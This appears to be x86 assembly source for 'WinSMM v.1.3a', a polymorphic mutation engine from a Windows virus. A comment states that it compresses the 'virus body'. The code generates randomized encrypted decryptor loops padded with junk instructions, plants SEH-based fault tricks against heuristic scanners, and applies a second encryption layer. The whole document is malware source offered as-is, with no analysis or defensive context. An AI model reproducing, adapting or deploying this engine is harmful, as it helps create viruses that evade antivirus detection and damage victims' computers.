   ; WinSMM v.1.3a

   maxgarb     =   7
   garb        =   0
   MaxGarbLevel    =   5
   MaxLoop     =   20
   MaxUp       =   10

   wsmm    proc    ; ESi - source, EDi - Dest, ECX - Size, EDX - base position(ip)
           ; EBX - ImageBase
       mov [xsrc][ebp],esi
       mov [xdst][ebp],edi
       mov [xcnt][ebp],ecx
       mov [ibase][ebp],ebx
       mov [ientry][ebp],edx

       mov [pointer][ebp],4
       mov [counter][ebp],4
       mov [keyword][ebp],4
       mov [reservd][ebp],4

       xor eax,eax
       mov [callnum][ebp],eax
       mov [inlvl][ebp],eax
       mov [xgarb][ebp],eax
       mov [fcallnum][ebp],eax
       mov [mupd][ebp],eax

       mov [FaultyZone][ebp],al
       mov [FaultyPush][ebp],al

       Call    getreg
       mov [pointer][ebp],al

   if  antih
       Call    garble

       mov [FaultyZone][ebp],1

       lea ebx,[pointer][ebp]  ; Mov Reg,offset SehProc
       mov eax,edx
       Call    EncodeMov

       mov al,50h          ; Push Reg
       add al,[pointer][ebp]
       stosb
       Call    garble
       Call    EncodePushIt
       Call    garble
       Call    EncodeMovIt

       mov [FaultyZone][ebp],0

       Call    garble
   endif

       xor eax,eax
       mov [callnum][ebp],eax
       mov al,4
       mov [pointer][ebp],al
       mov [counter][ebp],al

   badx:   Call    getreg
       cmp al,5            ; EBP ?
       jz  badx

       mov [pointer][ebp],al
       Call    getreg
       mov [counter][ebp],al
       Call    getreg
       mov [keyword][ebp],al

       Call    garble

       lea ebx,[pointer][ebp]
       mov eax,edx
       Call    EncodeMov

       mov al,0B8h
       add al,[counter][ebp]
       stosb
       mov [xCount][ebp],edi
       stosd

       lea ebx,[keyword][ebp]
       xor eax,eax
       call    getrnd
       mov [xkey][ebp],eax
       Call    EncodeMov

       push    edi         ; Start of decryption loop

       Call    garble

       mov eax,3
       Call    getrnd
       xchg    eax,ebx
       mov al,[ebx][ebp][crTbl]
       stosb
       mov al,[ebx][ebp][deTbl]
       mov 1 ptr [crValue][ebp],al
       mov al,[keyword][ebp]
       shl al,3
       add al,[pointer][ebp]
       stosb

       Call    garble

       lea ebx,[pointer][ebp]
       mov eax,4
       Call    EncodeAdd

       Call    garble

       lea ebx,[keyword][ebp]
       xor eax,eax
       call    getrnd
       mov [x2key][ebp],eax
       Call    EncodeAdd

       Call    garble

       mov al,48h          ; Dec counter
       add al,[counter][ebp]
       stosb

       mov ax,850Fh        ; jnz decrypt
       stosw

       pop eax
       sub eax,edi
       sub eax,4
       stosd

       Call    garble

   if  antih
       Call    EncodeFault
   else
       mov al,0B8h
       stosb
       mov eax,[ientry][ebp]
       stosd
       mov ax,0E0FFh
       stosw
   endif

       Call    garble

   xCc:    cmp [fcallnum][ebp],0
       jz  NoPPP
       Call    FPcall
       jmp xCc
   NoPPP:

       mov eax,edi
       sub eax,[xdst][ebp]
       push    eax

       mov esi,[xsrc][ebp]
       mov ecx,[xcnt][ebp]
       push    edi
       Call    Compress            ; Compress virus body
       pop edi
       mov esi,edi
       add edi,ecx

       push    edi edi
       mov edx,[ientry][ebp]
       Call    SecondLayer
       xchg    eax,ecx
       pop esi edx

       mov [cVir][ebp],ecx
       mov ebx,[xkey][ebp]
       shr ecx,2
       inc ecx

       mov eax,[xCount][ebp]
       mov [eax],ecx

   encrypt:xor [esi],ebx
   crValue equ $ - 2
       add ebx,[x2key][ebp]
       add esi,4
       loop    encrypt

       pop eax

       ret
   wsmm    endp
   ;--------------------------------------------------------------------
   gtbl    dd  offset MovReg32
       dd  offset MovReg16
       dd  offset Complex32
       dd  offset Jxx
       dd  offset Ccall
       dd  offset Pcall
       dd  offset IncDec
       dd  offset PushPop
       dd  offset XchgEax
       dd  offset RolsRors
       dd  offset BitTests
       dd  offset FPUBlock
       dd  offset FCcall
       dd  offset FPcall
       dd  offset SmallLoop
   gtbll   equ ($ - gtbl) shr 2

   SafeTbl dd  offset MovReg32
       dd  offset MovReg16
       dd  offset Complex32
       dd  offset Jxx
       dd  offset IncDec
       dd  offset PushPop
       dd  offset XchgEax
       dd  offset RolsRors
       dd  offset BitTests
       dd  offset FPUBlock
       dd  offset SmallLoop
   SafeLen equ ($ - SafeTbl) shr 2

   garble  proc
   if  garb
       ret
   endif
       push    ebx ecx eax
       inc [xgarb][ebp]
       cmp [xgarb][ebp],MaxGarbLevel
       ja  NoGarb
       cmp [reservd][ebp],4
       jz  MaxGG
       mov eax,maxgarb shr 1
       jmp DozXX
   MaxGG:  mov eax,maxgarb
   DozXX:  Call    getrnd
       inc eax
       xchg    eax,ecx
   fill:   push    ecx
   xfill:  cmp [reservd][ebp],4
       jz  ItsOk1
       mov eax,SafeLen
       jmp DoItxx
   ItsOk1: mov eax,gtbll
   DoItxx: Call    getrnd
       cmp [prev][ebp],eax
       jz  xfill
       mov [prev][ebp],eax
       cmp [reservd][ebp],4
       jz  ItsOkay
       lea eax,[eax*4][ebp][SafeTbl]
       jmp DoItxxx
   ItsOkay:lea eax,[eax*4][ebp][gtbl]
   DoItxxx:mov eax,[eax]
       add eax,ebp
       call    eax
       pop ecx
       loop    fill
   NoGarb: dec [xgarb][ebp]
       pop eax ecx ebx
       ret
   garble  endp

   ;=========================
   MovReg32:
       Call    getreg
       add al,0B8h
       stosb
       xor eax,eax
       Call    getrnd
       stosd
       ret
   ;=========================
   MovReg16:
       mov al,66h
       stosb
       Call    getreg
       add al,0B8h
       stosb
       xor eax,eax
       Call    getrnd
       stosw
       jmp MovReg32
   ;=========================
   cplx    db  03,13h,23h,33h,0Bh,1Bh,2Bh,3Bh
   cplxl   equ $ - cplx
   Complex32:
       mov eax,cplxl
       call    getrnd
       lea ebx,[eax][ebp][cplx]
       mov al,[ebx]
       stosb
       call    getreg
       push    eax
       call    getreg
       or  al,00011000b
       shl al,3
       pop ebx
       add al,bl
       stosb
       ret
   ;=========================
   Jxx:    mov al,0Fh
       stosb
       mov eax,16
       Call    getrnd
       add al,80h
       stosb
       push    edi
       stosd
       Call    garble
       pop ebx
       mov eax,edi
       sub eax,ebx
       sub eax,4
       mov [ebx],eax
       ret
   ;=========================
   Ccall:  cmp [inlvl][ebp],maxlvl
       jae SkipCall
       mov eax,[callnum][ebp]
       cmp eax,MaxCall-5
       jae SkipCall
       xchg    eax,ebx
       mov al,0E9h
       stosb
       push    edi
       stosd
       push    edi
       inc [inlvl][ebp]
       Call    garble
       dec [inlvl][ebp]
       pop eax
       mov ebx,[callnum][ebp]
       lea ecx,[ebx*4][ebp][calltbl]
       mov [ecx],eax
       inc [callnum][ebp]
       mov al,0C3h
       stosb
       pop eax
       mov ebx,edi
       sub ebx,eax
       sub ebx,4
       mov [eax],ebx
   SkipCall:
       ret

   Pcall:  cmp [FaultyZone][ebp],1
       jz  SkipCall
       mov eax,[callnum][ebp]
       or  eax,eax
       jz  SkipCall
       Call    getrnd
       lea eax,[eax*4][ebp][calltbl]
       mov eax,[eax]
       sub eax,edi
       sub eax,5
       push    eax
       mov al,0E8h
       stosb
       pop eax
       stosd
       ret
   ;====================================================================
   FCcall: cmp [FaultyZone][ebp],1
       jz  NoFCall
       cmp [inlvl][ebp],0
       jnz NoFCall

       cmp [fcallnum][ebp],MaxCall
       jae NoFCall
       cmp [mupd][ebp],MaxUp
       jae NoFCall

       inc [mupd][ebp]
       mov eax,[fcallnum][ebp]
       lea eax,[eax*4][ebp][fcalltbl]
       mov [eax],edi
       inc [fcallnum][ebp]

       mov al,0E8h
       stosb
       stosd

   NoFCall:
       ret

   FPcall: mov eax,[fcallnum][ebp]
       or  eax,eax
       jz  NoPFCall
       dec eax
       mov [fcallnum][ebp],eax
       lea ebx,[eax*4][ebp][fcalltbl]
       mov ebx,[ebx]
       push    edi
       mov al,0E9h
       stosb
       xor eax,eax
       stosd
       mov eax,edi
       sub eax,ebx
       sub eax,5
       mov [ebx][1],eax
       Call    garble
       mov al,0C3h
       stosb
       pop ebx
       mov eax,edi
       sub eax,ebx
       sub eax,5
       mov [ebx][1],eax
   NoPFCall:
       ret
   ;====================================================================
   IncDec: mov eax,2
       Call    getrnd
       shl eax,3
       push    eax
       Call    getreg
       add al,40h
       pop ebx
       add al,bl
       stosb
       ret
   ;====================================================================
   PushPop:
       cmp [FaultyPush][ebp],1
       jz  NoPushes
       mov eax,8
       Call    getrnd
       cmp al,4
       jz  PushPop
       add al,50h
       stosb
       Call    garble
       Call    getreg
       add al,58h
       stosb
   NoPushes:
       ret
   ;====================================================================
   XchgEax:
       xor eax,eax
       Call    checkreg
       jz  noxchg
       Call    getreg
       add al,90h
       stosb
   noxchg:
       ret
   ;====================================================================
   RolsRors:               ; Rols Roys :)
       mov eax,2
       Call    getrnd
       cmp al,1
       jnz notone
       inc eax
   notone: add al,0D1h
       stosb
       Call    getreg
       push    eax
       mov eax,6
       Call    getrnd
       shl eax,8
       pop ebx
       add eax,ebx
       add al,0C0h
       stosb
       ret
   ;====================================================================
   ptbl    db  0B3h,0B6h,0B7h,0BBh,0BCh,0BDh,0BEh,0BFh
   ptbll   equ $ - ptbl

   BitTests:
       mov al,0Fh
       stosb
       mov eax,ptbll
       Call    getrnd
       mov al,[eax][ptbl][ebp]
       stosb
       Call    getreg
       shl al,3
       add al,0C0h
       push    eax
       Call    getreg
       pop ebx
       add al,bl
       stosb
       ret
   ;====================================================================
   FPUTbl  dd  offset xFLD
       dd  offset xFSOME
       dd  offset xFADD
       dd  offset xFSUB
       dd  offset Jxx
       dd  offset Ccall
       dd  offset xFMUL
   FPUTbll equ ($ - FPUTbl) shr 2

   FPUBlock:
       inc [xgarb][ebp]
       cmp [xgarb][ebp],MaxGarbLevel
       ja  NoFPU
       mov eax,maxgarb
       Call    getrnd
       inc eax
       xchg    eax,ecx
   DoGarb: push    ecx
       mov eax,FPUTbll
       Call    getrnd
       mov eax,[eax*4][ebp][FPUTbl]
       add eax,ebp
       Call    eax
       pop ecx
       loop    DoGarb
   NoFPU:  dec [xgarb][ebp]
       ret
   ;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
   xFLD:   mov al,0D9h
       stosb
       mov eax,16
       Call    getrnd
       add al,0C0h
       stosb
       ret

   xFSOMEt db  0D9h,0E4h
       db  0D9h,0E5h
       db  0D9h,0D0h
       db  0DBh,0E3h
       db  0DAh,0E9h
       db  0D9h,0E1h
       db  0D9h,0E0h
       db  0D9h,0FCh
       db  0D9h,0FDh
       db  0D9h,0F4h
       db  0D9h,0FAh
       db  0D9h,0FEh
       db  0D9h,0FFh
       db  0D9h,0FBh
       db  0D9h,0F1h
       db  0D9h,0F9h
       db  0D9h,0F2h
       db  0D9h,0F3h
   xFSOMEtl    equ ($ - xFSOMEt) shr 1

   xFSOME: mov eax,xFSOMEtl
       Call    getrnd
       mov ax,2 ptr [eax*2][ebp][xFSOMEt]
       stosw
       ret

   xFADD:  mov al,0DCh
       stosb
       mov eax,8
       Call    getrnd
       add al,0C0h
       stosb
       ret

   xFSUB:  mov al,0DCh
       stosb
       mov eax,16
       Call    getrnd
       add al,0C0h
       stosb
       ret

   xFMUL:  mov al,0DEh
       stosb
       mov eax,8
       Call    getrnd
       add al,0C8h
       stosb
       ret
   ;====================================================================
   SmallLoop:
       cmp [reservd][ebp],4
       jnz NoLoop
       Call    getreg
       mov [reservd][ebp],al
       mov al,0B8h
       add al,[reservd][ebp]
       stosb
       mov eax,MaxLoop
       Call    getrnd
       inc eax
       stosd
       push    edi
       Call    garble
       mov al,48h
       add al,[reservd][ebp]
       stosb
       mov ax,850Fh
       stosw
       pop eax
       sub eax,edi
       sub eax,4
       stosd
       mov [reservd][ebp],4
   NoLoop: ret
   ;====================================================================
   getreg  proc
       mov eax,8
       Call    getrnd
       Call    checkreg
       jz  getreg
       ret
   getreg  endp

   checkreg    proc
       cmp al,4
       jz  xyes
       cmp [pointer][ebp],al
       jz  xyes
       cmp [counter][ebp],al
       jz  xyes
       cmp [keyword][ebp],al
       jz  xyes
       cmp [reservd][ebp],al
   xyes:   ret
   checkreg    endp
   ;----------------------------------------------------------------------

   getrnd  proc
       push    edx ecx eax
       mov eax,[rseed][ebp]
       rol eax,3
       add eax,1F32A4B2h
       xor eax,ebx
       mov [rseed][ebp],eax
       pop ecx
       or  ecx,ecx
       jz  nodiv
       xor edx,edx
       div ecx
       xchg    eax,edx
   nodiv:  pop ecx edx
       ret
   getrnd  endp

   crTbl   db  31h,01h,29h
   deTbl   db  31h,29h,01h
   cr2Tbl  db  33h,2Bh,03h
   ;----------------------------------------------------------------------
   MovTbl  dd  offset SimpleMov
       dd  offset XorMov
       dd  offset SubMov
       dd  offset AddMov
       dd  offset PushMov
   MovTbll equ ($ - MovTbl) shr 2

   EncodeMov   proc    ; EBX offset to reg, EAX - what to move
       push    eax
       mov eax,MovTbll
       Call    getrnd
       lea eax,[eax*4][ebp][MovTbl]
       mov eax,[eax]
       add eax,ebp
       pop ecx
       Call    eax
       ret
   EncodeMov   endp

   SimpleMov:
       mov al,0B8h
       add al,1 ptr [ebx]
       stosb
       mov eax,ecx
       stosd
       ret

   XorMov: xchg    eax,ecx
       push    eax ebx
       Call    EncodeFreeReg
       Call    garble
       pop ebx ecx
       mov al,81h
       stosb
       mov al,0F0h
       add al,1 ptr [ebx]
       stosb
       mov eax,ecx
       stosd
       ret

   SubMov: xchg    eax,ecx
       push    eax ebx
       Call    EncodeFreeReg
       Call    garble
       pop ebx ecx
       mov al,81h
       stosb
       mov al,0E8h
       add al,1 ptr [ebx]
       stosb
       mov eax,ecx
       neg eax
       stosd
       ret

   AddMov: xchg    eax,ecx
       push    eax ebx
       Call    EncodeFreeReg
       Call    garble
       pop ebx ecx
       mov al,81h
       stosb
       mov al,0C0h
       add al,1 ptr [ebx]
       stosb
       mov eax,ecx
       stosd
       ret

   PushMov:mov al,68h
       stosb
       mov eax,ecx
       stosd
       push    ebx
       Call    garble
       pop ebx
       mov al,58h
       add al,1 ptr [ebx]
       stosb
       ret
   ;----------------------------------------------------------------------
   FreeTbl dd  offset MovReg
       dd  offset XorReg
       dd  offset SubReg
   FreeTbll    equ ($ - FreeTbl) shr 2

   EncodeFreeReg   proc
       mov eax,FreeTbll
       Call    getrnd
       mov eax,[eax*4][ebp][FreeTbl]
       add eax,ebp
       Call    eax
       ret
   EncodeFreeReg   endp

   MovReg  proc
       mov al,0B8h
       add al,1 ptr [ebx]
       stosb
       xor eax,eax
       stosd
       ret
   MovReg  endp

   XorReg  proc
       mov al,33h
       stosb
       mov al,1 ptr [ebx]
       shl al,3
       add al,1 ptr [ebx]
       add al,0C0h
       stosb
       ret
   XorReg  endp

   SubReg  proc
       mov al,2Bh
       stosb
       mov al,1 ptr [ebx]
       shl al,3
       add al,1 ptr [ebx]
       add al,0C0h
       stosb
       ret
   SubReg  endp
   ;----------------------------------------------------------------------
   EncodeAdd   proc
       push    eax
       mov al,81h
       stosb
       mov eax,2
       Call    getrnd
       or  eax,eax
       jz  AddIt
       mov al,0E8h
       add al,1 ptr [ebx]
       stosb
       pop eax
       neg eax
       stosd
       ret
   AddIt:  mov al,0C0h
       add al,1 ptr [ebx]
       stosb
       pop eax
       stosd
       ret
   EncodeAdd   endp
   ;----------------------------------------------------------------------

   FaultTbl    dd  offset MovFault1
           dd  offset MovFault2
           dd  offset XchgFault
           dd  offset InvalidOpcode
           dd  offset ZeroDiv
   FaultTbll   equ ($ - FaultTbl) shr 2

   EncodeFault proc
       mov eax,FaultTbll
       Call    getrnd
       lea eax,[eax*4][ebp][FaultTbl]
       mov eax,[eax]
       add eax,ebp
       Call    eax
       ret
   EncodeFault endp

   MovFault1   proc
       mov al,89h
       stosb
       mov eax,8
       Call    getrnd
       shl al,3
       add al,5
       stosb
       mov eax,80000000h
       Call    getrnd
       add eax,07FFFFFFFh
       stosd
       ret
   MovFault1   endp

   MovFault2   proc
       mov ax,05C7h
       stosw
       mov eax,80000000h
       Call    getrnd
       add eax,07FFFFFFFh
       stosd
       xor eax,eax
       Call    getrnd
       stosd
       ret
   MovFault2   endp

   XchgFault   proc
       mov al,87h
       stosb
   bbreg:  mov eax,8
       Call    getrnd
       cmp al,4
       jz  bbreg
       shl al,3
       add al,5
       stosb
       mov eax,80000000h
       Call    getrnd
       add eax,07FFFFFFh
       stosd
       ret
   XchgFault   endp

   InvalidOpcode   proc
       xor eax,eax
       dec eax
       stosw
       ret
   InvalidOpcode   endp

   ZeroDiv proc
       mov al,4
       mov [pointer][ebp],al
       mov [counter][ebp],al
       mov [keyword][ebp],al
       mov [callnum][ebp],0
       Call    getreg
       mov [pointer][ebp],al
       lea ebx,[pointer][ebp]
       xor eax,eax
       Call    EncodeFreeReg
       Call    garble
       mov al,0F7h
       stosb
       mov al,[pointer][ebp]
       add al,0F0h
       stosb
       ret
   ZeroDiv endp
   ;----------------------------------------------------------------------
   EPushIt dd  offset MovPush1
       dd  offset MovPush2
       dd  offset Push1
       dd  offset Push2
   EPushItl    equ ($ - EPushIt) shr 2

   EncodePushIt    proc
       mov eax,EPushItl
       Call    getrnd
       lea eax,[eax*4][ebp][EPushIt]
       mov eax,[eax]
       add eax,ebp
       Call    eax
       ret
   EncodePushIt    endp

   MovPush1    proc
       mov al,64h
       stosb
       mov ax,8B67h
       stosw
       mov al,[pointer][ebp]
       shl al,3
       add al,6
       stosb
       xor eax,eax
       stosw
       Call    garble
       mov al,[pointer][ebp]
       add al,50h
       stosb
       ret
   MovPush1    endp

   MovPush2    proc
       mov al,64h
       stosb
       mov al,8Bh
       stosb
       mov al,[pointer][ebp]
       shl al,3
       add al,5
       stosb
       xor eax,eax
       stosd
       Call    garble
       mov al,[pointer][ebp]
       add al,50h
       stosb
       ret
   MovPush2    endp

   Push1   proc
       mov al,64h
       stosb
       mov ax,0FF67h
       stosw
       mov al,36h
       stosb
       xor eax,eax
       stosw
       ret
   Push1   endp

   Push2   proc
       mov al,64h
       stosb
       mov ax,35FFh
       stosw
       xor eax,eax
       stosd
       ret
   Push2   endp

   ;----------------------------------------------------------------------
   EMovIt  dd  offset SimpleMovIt
       dd  offset RegMovIt
   EMovItl equ ($ - EMovIt) shr 2

   EncodeMovIt proc
       mov eax,EMovItl
       Call    getrnd
       lea eax,[eax*4][ebp][EMovIt]
       mov eax,[eax]
       add eax,ebp
       Call    eax
       ret
   EncodeMovIt endp

   SimpleMovIt proc
       mov al,64h
       stosb
       mov ax,8967h
       stosw
       mov al,26h
       stosb
       xor eax,eax
       stosw
       ret
   SimpleMovIt endp

   RegMovIt    proc
       Call    getreg
       cmp al,5
       jz  RegMovIt
       mov [counter][ebp],al
       push    eax
       lea ebx,[counter][ebp]
       Call    EncodeFreeReg
       Call    garble
       mov al,64h
       stosb
       mov al,89h
       stosb
       pop eax
       add al,20h
       stosb
       mov [counter][ebp],4
       ret
   RegMovIt    endp

   ;----------------------------------------------------------------------
   S2L dd  ?
   Sxkey   dd  ?
   Sx2key  dd  ?
   S2P dd  ?
   SEDI    dd  ?

   SecondLayer proc            ; ESI - SRC; EDI - Dst; EDX - Base
       push    edi esi

       mov [FaultyPush][ebp],1

       shr ecx,2
       inc ecx
       mov [S2L][ebp],ecx
       mov [S2P][ebp],edx
       mov [SEDI][ebp],edi

           mov     al,4
       mov [pointer][ebp],al
       mov [counter][ebp],al
       mov [keyword][ebp],al
       mov [reservd][ebp],al
       xor eax,eax
       mov [callnum][ebp],eax

   badx2:  Call    getreg
       cmp al,5            ; EBP ?
       jz  badx2

       mov [pointer][ebp],al
       Call    getreg
       mov [counter][ebp],al
       Call    getreg
       mov [keyword][ebp],al
       Call    garble

       mov al,0B8h
       add al,[pointer][ebp]
       stosb
       push    edi
       stosd

       lea ebx,[counter][ebp]
       mov eax,[S2L][ebp]
       Call    EncodeMov

       lea ebx,[keyword][ebp]
       xor eax,eax
       call    getrnd
       mov [Sxkey][ebp],eax
       Call    EncodeMov

       push    edi         ; Start of decryption loop

       Call    garble

       mov eax,3
       Call    getrnd
       xchg    eax,ebx
       mov al,[ebx][ebp][crTbl]
       stosb
       mov al,[ebx][ebp][cr2Tbl]
       mov 1 ptr [CrpMet][ebp],al
       mov al,[keyword][ebp]
       shl al,3
       add al,[pointer][ebp]
       stosb

       Call    garble

       lea ebx,[pointer][ebp]
       mov eax,4
       Call    EncodeAdd

       Call    garble

       lea ebx,[keyword][ebp]
       xor eax,eax
       call    getrnd
       mov [Sx2key][ebp],eax
       Call    EncodeAdd

       Call    garble

       mov al,48h          ; Dec counter
       add al,[counter][ebp]
       stosb

       mov ax,850Fh        ; jnz decrypt
       stosw

       pop eax
       sub eax,edi
       sub eax,4
       stosd

       pop ebx
       mov eax,edi
       sub eax,[SEDI][ebp]
       add eax,[S2P][ebp]
       mov [ebx],eax

       pop esi
       mov ecx,[S2L][ebp]
       mov edx,[Sxkey][ebp]
   DoCrp:  lodsd
   CrpMet  db  ?
       db  0C2h
       stosd
       add edx,[Sx2key][ebp]
       loop    DoCrp

   xxCc:   cmp [fcallnum][ebp],0
       jz  No2PPP
       Call    FPcall
       jmp xxCc
   No2PPP:

       pop eax
       xchg    eax,edi
       sub eax,edi

       mov [FaultyPush][ebp],0

       ret
   SecondLayer endp

   include uc.inc
